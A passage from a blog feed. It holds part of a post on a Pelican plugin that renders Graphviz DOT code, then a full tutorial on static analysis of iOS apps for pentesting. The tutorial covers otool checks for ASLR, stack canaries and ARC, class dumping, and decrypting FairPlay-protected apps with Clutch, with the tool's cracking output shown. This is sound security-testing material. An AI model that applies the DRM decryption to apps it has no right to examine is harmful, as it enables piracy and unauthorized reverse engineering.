<p>Using <a href="https://github.com/getpelican/pelican-plugins/tree/master/liquid_tags">liquid tags</a> I wanted to get my graphviz code rendered and automatically included as a <strong>base64 encoded</strong> image in my HTML code. I&rsquo;ve created a <a href="https://github.com/getpelican/pelican-plugins/pull/356">pull request</a> but you can find a fork at <a href="https://github.com/dorneanu/pelican-plugins">dorneanu-pelican</a>.</p>
<p>Basically the tags works as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">{% graphviz 
	&lt;program&gt; {
		&lt;DOT CODE&gt;
	}
%}
</code></pre></div><p><code>program</code> could be <code>dot</code>, <code>neato</code>, <code>twopi</code>, <code>circo</code> etc. The <code>DOT CODE</code> is simply sent to the binary utility and the output (PNG data) is saved into the document.</p>
<p>This is some minimal example:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">{% graphviz 
	dot { 
			digraph graphname { 
				a -&gt; b -&gt; c; 
				b -&gt; d; 
				e -&gt; f;	
			} 
		}
%}
</code></pre></div><p>which will be rendered to:</p>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    Graphviz code
    
  </summary>
  dot {
digraph graphname {
a -&gt; b -&gt; c;
b -&gt; d;
e -&gt; f;
}
}
</details>

<p><img src="/posts/img/2014/pelican-graphviz-liquid-tags/example1.dot.png" alt="example1"></p>
<p>You could then use <code>neato</code> instead of <code>dot</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">{% graphviz 
neato { 
        digraph graphname { 
            a -&gt; b -&gt; c; 
            b -&gt; d; 
            e -&gt; f;	
        } 
    }
%}
</code></pre></div><p>&hellip;which will be rendered to:</p>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    Graphviz code
    
  </summary>
  neato {
digraph graphname {
a -&gt; b -&gt; c;
b -&gt; d;
e -&gt; f;
}
}
</details>

<p><img src="/posts/img/2014/pelican-graphviz-liquid-tags/example2.dot.png" alt="example2"></p>
<p>Some other examples:</p>
<ul>
<li>dot
<ul>
<li>digraph</li>
</ul>
</li>
</ul>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    Graphviz code
    
  </summary>
  <pre><code>dot {
	digraph g {
		node [fontname=Verdana,fontsize=12]
		node [style=filled]
	 	node [fillcolor=&quot;#EEEEEE&quot;]
	 	node [color=&quot;#EEEEEE&quot;]
	 	edge [color=&quot;#31CEF0&quot;]
		node [shape = record,height=.1];
		node0[label = &quot; | G| &quot;];
		node1[label = &quot; | E| &quot;];
		node2[label = &quot; | B| &quot;];
		node3[label = &quot; | F| &quot;];
		node4[label = &quot; | R| &quot;];
		node5[label = &quot; | H| &quot;];
		node6[label = &quot; | Y| &quot;];
		node7[label = &quot; | A| &quot;];
		node8[label = &quot; | C| &quot;];
		&quot;node0&quot;:f2 -&gt; &quot;node4&quot;:f1;
		&quot;node0&quot;:f0 -&gt; &quot;node1&quot;:f1;
		&quot;node1&quot;:f0 -&gt; &quot;node2&quot;:f1;
		&quot;node1&quot;:f2 -&gt; &quot;node3&quot;:f1;
		&quot;node2&quot;:f2 -&gt; &quot;node8&quot;:f1;
		&quot;node2&quot;:f0 -&gt; &quot;node7&quot;:f1;
		&quot;node4&quot;:f2 -&gt; &quot;node6&quot;:f1;
		&quot;node4&quot;:f0 -&gt; &quot;node5&quot;:f1;
	}
}
</code></pre>

</details>

<p><img src="/posts/img/2014/pelican-graphviz-liquid-tags/example3.dot.png" alt="example3"></p>
<ul>
<li>dot
<ul>
<li>subgraphs</li>
</ul>
</li>
</ul>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    Graphviz code
    
  </summary>
  <pre><code>dot {
	digraph G {
		node [fontname=Verdana,fontsize=12]
		node [style=filled]
	 	node [fillcolor=&quot;#EEEEEE&quot;]
	 	node [color=&quot;#EEEEEE&quot;]
	 	edge [color=&quot;#31CEF0&quot;]

		subgraph cluster_0 {
			label = &quot;hello world&quot;;
			a -&gt; b;
			a -&gt; c;
			color = hot_pink;
		}

		subgraph cluster_1 {
			label = &quot;MSDOT&quot;;
			style= &quot;dashed&quot;;
			color=purple;
			x -&gt; y;
			x -&gt; z;
			y -&gt; z;
			y -&gt; q;
		}

		top -&gt; a;
		top -&gt; y;
		y -&gt; b;
	}
}
</code></pre>

</details>

<p><img src="/posts/img/2014/pelican-graphviz-liquid-tags/example4.dot.png" alt="example4"></p>
<ul>
<li>neato</li>
</ul>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    Graphviz code
    
  </summary>
  <pre><code>neato {
	graph G
	{

	  node [color=Red]

	  r01
	  r02

	  r03

	  r04
	  r05

	  r06
	  r07
	  r08
	  r09

	  r10
	  r11

	  node [color=Blue]

	  p01
	  p02

	  p03

	  p04
	  p05
	  p06

	  p07
	  p08
	  p09
	  p10
	  p11

	  p12
	  p13

	  r01 -- r02
	  r01 -- p01
	  r01 -- p02
	  r02 -- p01
	  r02 -- p02
	  p01 -- p02

	  r03 -- p03

	  r04 -- r05
	  r04 -- p04
	  r04 -- p05
	  r04 -- p06
	  r05 -- p04
	  r05 -- p06
	  p04 -- p05
	  p04 -- p06

	  r06 -- r07
	  r06 -- r08
	  r06 -- r09
	  r06 -- p07
	  r06 -- p08
	  r06 -- p09
	  r06 -- p10
	  r06 -- p11
	  r07 -- r08
	  r07 -- r09
	  r07 -- p07
	  r07 -- p08
	  r07 -- p09
	  r07 -- p10
	  r07 -- p11
	  r08 -- r09
	  r08 -- p07
	  r08 -- p08
	  r08 -- p09
	  r08 -- p10
	  r08 -- p11
	  r09 -- p07
	  r09 -- p08
	  r09 -- p09
	  r09 -- p10
	  r09 -- p11
	  p07 -- p08
	  p07 -- p09
	  p07 -- p10
	  p07 -- p11
	  p08 -- p09
	  p08 -- p10
	  p08 -- p11
	  p09 -- p10
	  p09 -- p11
	  p10 -- p11

	  r10 -- r11
	  r10 -- p12
	  r10 -- p13
	  r11 -- p12
	  r11 -- p13
	  p12 -- p13
	}
}
</code></pre>

</details>

<p><img src="/posts/img/2014/pelican-graphviz-liquid-tags/example5.dot.png" alt="example5"></p>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    Graphviz code
    
  </summary>
  <pre><code>neato {
	graph ER {
		node [shape=box]; course; institute; student;
		node [shape=ellipse]; {node [label=&quot;name&quot;] name0; name1; name2;}
			code; grade; number;
		node [shape=diamond,style=filled,color=lightgrey]; &quot;C-I&quot;; &quot;S-C&quot;; &quot;S-I&quot;;

		name0 -- course;
		code -- course;
		course -- &quot;C-I&quot; [label=&quot;n&quot;,len=1.00];
		&quot;C-I&quot; -- institute [label=&quot;1&quot;,len=1.00];
		institute -- name1;
		institute -- &quot;S-I&quot; [label=&quot;1&quot;,len=1.00];
		&quot;S-I&quot; -- student [label=&quot;n&quot;,len=1.00];
		student -- grade;
		student -- name2;
		student -- number;
		student -- &quot;S-C&quot; [label=&quot;m&quot;,len=1.00];
		&quot;S-C&quot; -- course [label=&quot;n&quot;,len=1.00];

		label = &quot;\n\nEntity Relation Diagram\ndrawn by NEATO&quot;;
		fontsize=20;
	}
}
</code></pre>

</details>

<p><img src="/posts/img/2014/pelican-graphviz-liquid-tags/example6.dot.png" alt="example6"></p>
<ul>
<li>twopi</li>
</ul>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    Graphviz code
    
  </summary>
  <pre><code>twopi {
	digraph G
	{
	        center = v21;

	        center -&gt; v11;
	        center -&gt; v12;
	        center -&gt; v13;

	        v11 -&gt; v21;
	        v11 -&gt; v22;
	        v11 -&gt; v23;

	        v21 -&gt; v22;
	        v22 -&gt; v23;
	        v23 -&gt; v21;

	        v21 -&gt; v31;
	        v21 -&gt; v32;
	        v21 -&gt; v33;

	        v32 -&gt; v41;
	        v32 -&gt; v42;
	        v33 -&gt; v43;
	}
}
</code></pre>

</details>

<p><img src="/posts/img/2014/pelican-graphviz-liquid-tags/example7.dot.png" alt="example7"></p>
<ul>
<li>circo</li>
</ul>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    Graphviz code
    
  </summary>
  <pre><code>circo {
	digraph g1 {
	    node [shape = doublecircle]; N4 N6;
	    node [shape = circle];
	    edge[label=&quot;{1,0}&quot;];
	    N0 -&gt; N1 -&gt; N2 -&gt; N3 -&gt; N4 -&gt; N5 -&gt; N6 -&gt; N0;
	}
}
</code></pre>

</details>

<p><img src="/posts/img/2014/pelican-graphviz-liquid-tags/example8.dot.png" alt="example8"></p>
<ul>
<li>misc</li>
</ul>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    Graphviz code
    
  </summary>
  <pre><code>dot {
	digraph G {
	 node [fontname=Verdana,fontsize=12]
	 node [style=filled]
	 node [fillcolor=&quot;#EEEEEE&quot;]
	 node [color=&quot;#EEEEEE&quot;]
	 edge [color=&quot;#31CEF0&quot;]
	 
	 main -&gt; parse -&gt; execute
	 main -&gt; init
	 main -&gt; cleanup
	 execute -&gt; make_string
	 execute -&gt; printf
	 init -&gt; make_string
	 main -&gt; printf
	 execute -&gt; compare
	}
}
</code></pre>

</details>

<p><img src="/posts/img/2014/pelican-graphviz-liquid-tags/example9.dot.png" alt="example9"></p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HowTo: iOS Apps - Static analysis</title>
      <link>https://blog.dornea.nu/2014/10/29/howto-ios-apps-static-analysis/</link>
      <pubDate>Wed, 29 Oct 2014 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2014/10/29/howto-ios-apps-static-analysis/</guid>
      <content:encoded><![CDATA[<p>In this short article I&rsquo;ll try to explain what are the main steps to analyze an iOS app. Since I&rsquo;ve writen similar posts related to <a href="/tag/android/">Android</a> I thought I could devote some of spare time writing about the steps required to analyze iOS apps/binaries. But first of all let&rsquo;s start with:</p>
<h2 id="whats-an-ios-app">What&rsquo;s an iOS app?</h2>
<p>In a nutshell here are the main characteristics:</p>
<ul>
<li>Objective-C / C / C++ compiled (ARM) executable</li>
<li>mostly encrypted using Apple&rsquo;s <a href="http://en.wikipedia.org/wiki/FairPlay">Fairplay</a> DRM</li>
<li>it runs in a sandbox</li>
<li>it&rsquo;s installed by the user <code>mobile</code></li>
<li>apps come as an <strong>IPA</strong> file which is the counterpart to Android&rsquo;s <strong>APK</strong></li>
</ul>
<p>Now that you roughly know what an iOS app is let&rsquo;s have a look at the most common <em>blackbox</em> pentesting tools out there. In this post I&rsquo;ll focus only on <em>static analysis</em>. <em>Dynamic analysis</em> (also known as <em>runtime analysis</em>) will be covered in a future post.</p>
<h2 id="binary-analysis-tools">Binary Analysis Tools</h2>
<p>Assuming you&rsquo;ve already jailbreaked your device, you&rsquo;ll definitely need these tools:</p>
<ul>
<li><strong>SSH</strong> - For connecting to the device</li>
<li><strong>ipainstaller</strong> - Install <a href="http://en.wikipedia.org/wiki/.ipa_%28file_extension%29">IPA</a> files</li>
<li><strong>otool</strong> - object file displaying <a href="http://developer.apple.com/library/mac/#documentation/Darwin/Reference/ManPages/man1/otool.1.html">tool</a></li>
<li><a href="https://github.com/nygard/class-dump"><strong>class-dump-z</strong></a> -  Examine Mach-O files and dump segments as Objective-C declarations</li>
<li>Dump encrypted app
<ul>
<li><a href="https://github.com/stefanesser/dumpdecrypted"><strong>dumpdecrypted</strong></a> - Dumps decrypted mach-o files from encrypted iPhone applications from memory to disk</li>
<li><a href="https://github.com/KJCracks/Clutch"><strong>Clutch</strong></a></li>
</ul>
</li>
</ul>
<h2 id="ipa">IPA</h2>
<p><strong>ipa</strong> files are archive files which are usually encrypted using Apple&rsquo;s FairPlay DRM. In a nutshell an ipa file consists of:</p>
<p>{% img <a href="http://oi60.tinypic.com/15q2ici.jpg">http://oi60.tinypic.com/15q2ici.jpg</a> 600 200 &ldquo;IPA-File&rdquo; &ldquo;IPA-File&rdquo; %}</p>
<p>The <strong>App binary</strong> is the target to be analyzed. It&rsquo;s compiled for ARM and used the <strong>Mach-O</strong>(mach object) file format. Check out next section for more detailed information.</p>
<h4 id="installing-the-app">Installing the App</h4>
<p>Usually you can manually install apps by using <strong>ipainstaller</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># ipainstaller &lt;ipa file&gt;
...
</code></pre></div><p>This will install your app under <code>/var/mobile/Applications</code>. Just do a <code>grep</code> to find out to which folder your app was copied to.</p>
<h2 id="mach-o">Mach-O</h2>
<p>The Mach-O binary consists of 3 components:</p>
<p>{% img <a href="https://developer.apple.com/library/mac/documentation/DeveloperTools/Conceptual/MachORuntime/art/mach_o_segments.gif">https://developer.apple.com/library/mac/documentation/DeveloperTools/Conceptual/MachORuntime/art/mach_o_segments.gif</a> 600 200 Mach-O Mach-O %}</p>
<h4 id="header">Header</h4>
<p>The <strong>header</strong> contains basic file type information like architecture and several flags. Using <strong>otool</strong> you can have a look a the headers:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># otool -h BINARY
BINARY:
Mach header
      magic cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
 0xfeedfacf 16777228          0  0x00          2    29       3832 0x00200085
</code></pre></div><p>Sometimes you&rsquo;ll get an application that is built for multiple architectures. These applications then consist of multiple Mach-O files and are called <strong>fat</strong> or <strong>universal</strong> binaries. Mach-O fat binaries not only group completely different CPU architectures (PowerPC, Intel) but also 32- or 64-bit versions of an architecture. Besides that you&rsquo;ll also get different CPU subtypes bundled in one binary. The device running the binary will choose the &ldquo;part&rdquo; of the binary it can best support. Also have a look at this great <a href="http://wanderingcoder.net/2010/07/19/ought-arm/">article</a>.</p>
<p>Here is an example of a fat binary:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># otool -arch all -h PewPew 
PewPew (architecture cputype (12) cpusubtype (9)):
Mach header
      magic cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
 0xfeedface      12          9  0x00          2    29       3544 0x00210085
PewPew (architecture cputype (12) cpusubtype (11)):
Mach header
      magic cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
 0xfeedface      12         11  0x00          2    29       3544 0x00210085
</code></pre></div><h4 id="load-commands">Load commands</h4>
<p>The <a href="https://developer.apple.com/library/mac/documentation/DeveloperTools/Conceptual/MachORuntime/index.html#//apple_ref/doc/uid/20001298-89026">load commands</a> are located directly after the header and specify the logical structure of the binary (as a file) and it&rsquo;s representation in the virtual memory (using offsets). Besides that you&rsquo;ll be able to get:</p>
<ul>
<li>the symbol table</li>
<li>shared library details</li>
</ul>
<p>For my understanding it&rsquo;s pretty much the same as ELFs segments and sections:</p>
<p>{% img <a href="http://oi59.tinypic.com/3478ltk.jpg">http://oi59.tinypic.com/3478ltk.jpg</a> 600 200 ELF ELF %}</p>
<p>Load commands also define whether an application is encrypted or not. To have a look at the those run:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># otool -Vl BINARY
...
</code></pre></div><h4 id="raw-segment-data">Raw segment data</h4>
<p>In the Mach-O file you&rsquo;ll also have <a href="https://developer.apple.com/library/mac/documentation/DeveloperTools/Conceptual/MachOTopics/0-Introduction/introduction.html">raw data</a> for the segments specified in the load commands. One segment can consist of multiple sections.</p>
<h2 id="runtime-protection-features">Runtime protection features</h2>
<p>iOS has several mechanisms which prevent application from being compromised at runtime. In order to understand the security issues that affect iOS applications, it is important to understand and to known the security features of the platform. The main security features of iOS <a href="http://www.apple.com/ipad/business/docs/iOS_Security_Feb14.pdf">are</a>:</p>
<ul>
<li>
<p><strong>Code signing</strong></p>
<ul>
<li>Ensures that all applications come from a approved source (using Apple-issued certificates)</li>
</ul>
</li>
<li>
<p><strong>Generic exploit mitigations</strong></p>
<ul>
<li>Address Space Layout Randomization (<a href="http://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a>)
<ul>
<li>Usually compiled using <code>-fPIE â€“pie</code></li>
</ul>
</li>
<li>Non Executable Memory (<a href="http://en.wikipedia.org/wiki/Address_space_layout_randomization">ARM&rsquo;s Execute Never</a> feature)</li>
<li>Stack Smashing Protections (<a href="http://wiki.osdev.org/Stack_Smashing_Protector">SSP</a>)
<ul>
<li>Usually compiled with <code>â€“fstack-protector-all</code> flag</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Sandboxing</strong></p>
<ul>
<li>run applications as non-privileged user</li>
<li>3rd-party apps are restricted in accessing files stored by other apps</li>
</ul>
</li>
<li>
<p><strong>Memory Management</strong></p>
<ul>
<li>Automatic Reference Counting (<a href="https://developer.apple.com/library/ios/releasenotes/objectivec/rn-transitioningtoarc/Introduction/Introduction.html">ARC</a>) protects applications from memory coruption issues by letting the compiler do the memory management stuff</li>
</ul>
</li>
</ul>
<p>Keeping all this stuff in mind, let&rsquo;s pickup some binary and go for it.</p>
<h2 id="analyzing-the-binary">Analyzing the binary</h2>
<p>Comparing Android to iOS I must admit you&rsquo;ll have to overcome more (technical) challenges for a successful analysis. iOS uses <strong>binary</strong> files (instead of <em>bytecode</em>). Having that said I&rsquo;ll be using <strong>otool</strong> (which seems to be the equivalent to <strong>readelf</strong>) to inspect the binary.</p>
<h4 id="architecture">Architecture</h4>
<p>Let&rsquo;s first determine the <em>architecture</em> the binary was compiled for:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># otool -f BINARY                                                                                              
Fat headers
fat_magic 0xcafebabe
nfat_arch 2
architecture 0
    cputype 12
    cpusubtype 9
    capabilities 0x0
    offset 16384
    size 2712496
    align 2^14 (16384)
architecture 1
    cputype 16777228
    cpusubtype 0
    capabilities 0x0
    offset 2736128
    size 3213664
    align 2^14 (16384)
</code></pre></div><p>Or using old-school <code>file</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># file BINARY
PM: Mach-O fat file with 2 architectures
</code></pre></div><p>Also have a look at this cool <a href="http://blakespot.com/ios_device_specifications_grid.html">list</a>.</p>
<h4 id="encryption">Encryption</h4>
<p>Usually the <code>ipa</code> file will be decrypted at runtime by the kernel&rsquo;s mach loader. If the binary is encrypted or not is easily found out using:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># otool -l BINARY | grep -A 4 LC_ENCRYPTION_INFO
</code></pre></div><p>In this case the binary file is <strong>not</strong> encrypted. Let me show an example where the binary <strong>is</strong> encrypted:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># otool -l OTHER_BINARY | grep -A 4 LC_ENCRYPTION_INFO                            
          cmd LC_ENCRYPTION_INFO
      cmdsize 20
 cryptoff  16384
 cryptsize 10502144
 cryptid   1
</code></pre></div><h3 id="runtime-protections-mechanisms">Runtime protections mechanisms</h3>
<p>This time I&rsquo;ll show you how to extract some valuable information from the binary itself regarding some runtime protection mechanisms:</p>
<ul>
<li><strong>ASLR</strong>
<ul>
<li>Usually the binary is compiled using the <code>PIE</code> flag</li>
</ul>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># otool -Vh BINARY 
WH Quest:
Mach header
      magic cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
   MH_MAGIC     ARM          9  0x00     EXECUTE    45       4684   NOUNDEFS DYLDLINK TWOLEVEL BINDS_TO_WEAK PIE
</code></pre></div><p>Have you noticed the <code>PIE</code> flag at the end of the list?</p>
<ul>
<li><strong>Stack Smashing Protection</strong>
<ul>
<li>iOS applications usually use <a href="http://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries"><strong>stack canaries</strong></a></li>
<li>therefore you should find certain symbols inside the binary (like <code>_stack_chk_guard</code> and <code>_stack_chk_fail</code>)</li>
</ul>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># otool -v -l BINARY | grep stack
...
</code></pre></div><ul>
<li><strong>Automatic Reference Couting</strong>
<ul>
<li>this option can be enabled by activating the compiler option &ldquo;Objective-C Automatic Reference Counting&rdquo;</li>
<li>binaries built with this option should include symbols called <code>_objc_release</code>, <code>_obj_autorelease</code>, <code>_obj_storeStrong</code>, <code>_obj_retain</code></li>
</ul>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># otool -v -I BINARY  | grep release
0x008b8ce4 241789 _objc_autorelease
0x008b8cf4 241790 _objc_autoreleasePoolPop
0x008b8d04 241791 _objc_autoreleasePoolPush
0x008b8d14 241792 _objc_autoreleaseReturnValue
0x008b8ea4 241817 _objc_release
0x008b8ed4 241820 _objc_retainAutorelease
0x008b8ee4 241821 _objc_retainAutoreleaseReturnValue
0x008b8ef4 241822 _objc_retainAutoreleasedReturnValue
0x008b9504 241439 ___cxa_guard_release
0x008b9674 241341 __Block_release
0x008b9ab4 241551 _dispatch_release
0x00a0c3f4 229369 __ZN11GPASWrapperI6GPHashE7releaseEv
0x00a12e8c 241789 _objc_autorelease
0x00a12e90 241790 _objc_autoreleasePoolPop
0x00a12e94 241791 _objc_autoreleasePoolPush
0x00a12e98 241792 _objc_autoreleaseReturnValue
0x00a12efc 241817 _objc_release
0x00a12f08 241820 _objc_retainAutorelease
0x00a12f0c 241821 _objc_retainAutoreleaseReturnValue
0x00a12f10 241822 _objc_retainAutoreleasedReturnValue
0x00a13094 241439 ___cxa_guard_release
0x00a130f0 241341 __Block_release
0x00a13200 241551 _dispatch_release
</code></pre></div><h4 id="dangerous-functions">Dangerous functions</h4>
<p>Beside the previosly mentioned symbols we can also seek for symbols aimed at (classical) memory management mechanisms like <code>malloc</code> and <code>free</code>. Their presence indicate that the application has its own memory management which is the opposite to <strong>ARC</strong>. While this is not always a bad thing it could easily lead to some memory related vulnerabilities if not handled properly.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># otool -v -I BINARY  | grep malloc
0x008b9f64 241776 _malloc
0x00a1332c 241776 _malloc

# otool -v -I BINARY  | grep free  
0x008b9cb4 241583 _free
0x008b9cc4 241584 _freeifaddrs
0x00a13280 241583 _free
0x00a13284 241584 _freeifaddrs
</code></pre></div><blockquote>
<p>Sometimes you&rsquo;ll find goodies like <code>strcpy</code> :)</p>
</blockquote>
<h2 id="understand-the-app">Understand the App</h2>
<p>Now that we have examined the binary we should proceed and try to &ldquo;understand&rdquo; the application. This means we have to look at it from a <em>logical perspective</em> and identify its main components. Afterwards one can go into detail and analyze only certain parts of the application which might be of interest.</p>
<p>Using <code>class-dump-z</code> we&rsquo;ll dump the class information:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># class-dump-z BINARY | head -20
Warning: Part of this binary is encrypted. Usually, the result will be not meaningful. Try to provide an unencrypted version instead.
/**
 * This header is generated by class-dump-z 0.2-0.
 * class-dump-z is Copyright (C) 2009 by KennyTM~, licensed under GPLv3.
 *
 * Source: (null)
 */

@protocol XXEncryptedProtocol_aff088
@property(assign) ? XXEncryptedProperty_8bd3a0;
@property(assign) ? XXEncryptedProperty_8bd383;
@property(assign) ? XXEncryptedProperty_8bd373;
@property(assign) ? XXEncryptedProperty_8bd369;
-(?)XXEncryptedMethod_93d1ce;
-(?)XXEncryptedMethod_93d1c3;
-(?)XXEncryptedMethod_93d1be;
-(?)XXEncryptedMethod_93d1b9;
-(?)XXEncryptedMethod_93d1ad;
-(?)XXEncryptedMethod_93c8e5;
-(?)XXEncryptedMethod_93c784;
-(?)XXEncryptedMethod_93c697;

</code></pre></div><p>Every class name seems to be encrypted. That&rsquo;s a good hint you should decrypt the binary in case you haven&rsquo;t done so yet.</p>
<h3 id="decrypt-binary">Decrypt binary</h3>
<p>Since every application downloaded from the AppStore is encrypted using Apple&rsquo;s FairPlay DRM you&rsquo;ll have to decrypt them before starting your analysis. For this step I&rsquo;ll be using <code>clutch</code> to dump the relevant data from memory to disk.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># Clutch MyAPP
Cracking MyAPP...
Creating working directory...
Performing initial analysis...
Performing cracking preflight...
yolofat magic 4277009102
Application is a thin binary, cracking single architecture...
dumping binary: analyzing load commands
found vmaddr
found LC_ENCRYPTION
found LC_CODE_SIGNATURE
dumping binary: obtaining ptrace handle
dumping binary: forking to begin tracing
dumping binary: obtaining mach port
dumping binary: preparing code resign
dumping binary: preparing to dump
dumping binary: ASLR enabled, identifying dump location dynamically
dumping binary: performing dump
dumping binary: patched cryptid
dumping binary: writing new checksum
Censoring iTunesMetadata.plist...
warning: iTunesMetadata.plist item named &#39;asset-info&#39; is unrecognized
warning: iTunesMetadata.plist item named &#39;product-type&#39; is unrecognized
warning: iTunesMetadata.plist item named &#39;bundleDisplayName&#39; is unrecognized
Packaging IPA file...
Compressing second stage payload (2/2)...
    /var/root/Documents/Cracked/MyAPP.ipa
</code></pre></div><p>Now that you have decrypted to binary and got a fresh new IPA file, you&rsquo;re ready to unpack it:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># unzip -d MyAPP MyAPP.ipa
...
</code></pre></div><p>Afterwards you can have a look at the new binary using <code>class-dump-z</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># class-dump-z BINARY  | head -n 20
/**
 * This header is generated by class-dump-z 0.2-0.
 * class-dump-z is Copyright (C) 2009 by KennyTM~, licensed under GPLv3.
 *
 * Source: (null)
 */

typedef struct _NSZone NSZone;

typedef struct CGPoint {
    float x;
    float y;
} CGPoint;

typedef struct CGSize {
    float width;
    float height;
} CGSize;

typedef struct CGRect {

</code></pre></div><p>Much better, isn&rsquo;t it? :)</p>
<h3 id="disassemble-binary">Disassemble binary</h3>
<p>I don&rsquo;t want to be too specific and go into too much detail. A good <em>disassembler</em> could save you a <strong>lot</strong> of time. I really like <a href="http://www.hopperapp.com/">Hopper</a> because it&rsquo;s <em>free</em> and <em>easy</em> to use. For the geeks out there feel free to throw your binary into <a href="https://www.hex-rays.com/products/ida/">IDA</a> and let the bin rock. Particularly noteworthy is also <a href="http://www.radare.org/y/">radare2</a> which is unix-like reverse engineering framework.</p>
<h2 id="conclusion">Conclusion</h2>
<p>Binary analysis can be a hell of a lot of fun if you have the right tools. Especially when you&rsquo;re not used to Apple&rsquo;s universe and don&rsquo;t have a Mac OS machine it could be useful to jailbreak your smartphone/tablet and install your tools there. <em>Gather</em> as much information as you can get to get a pretty precise image of what you&rsquo;re dealing with. <em>Disassemble</em> your binary to get more in &ldquo;contact&rdquo;. Afterwards <em>run</em> it and do some runtime analysis.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="http://conference.hitb.org/hitbsecconf2013ams/materials/D2T2%20-%20Chilik%20Tamir%20-%20iAnalyzer%20-%20No%20More%20Blackbox%20iOS%20Analysis.pdf">iNalyzer â€“ No More iOS Blackbox Assessments</a></li>
<li><a href="https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577">iPwn Apps: Pentesting iOS Applications</a></li>
<li><a href="http://reverse.put.as/wp-content/uploads/2011/06/pentestingiosapps-deepsec2012-andreaskurtz.pdf">Pentesting iOS Apps Runtime Analysis and Manipulation</a></li>
<li><a href="http://resources.infosecinstitute.com/part-15-static-analysis-of-ios-apps-using-inalyzer/">IOS Application Security Part 15 â€“ Static Analysis of IOS Applications using iNalyzer</a></li>
<li><a href="http://books.google.de/books?id=huy8AwAAQBAJ&amp;printsec=frontcover#v=onepage&amp;q&amp;f=false">Hacking and Securing iOS Applications</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Generate all IP addresses from ASN</title>
      <link>https://blog.dornea.nu/2014/09/17/generate-all-ip-addresses-from-asn/</link>
      <pubDate>Wed, 17 Sep 2014 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2014/09/17/generate-all-ip-addresses-from-asn/</guid>
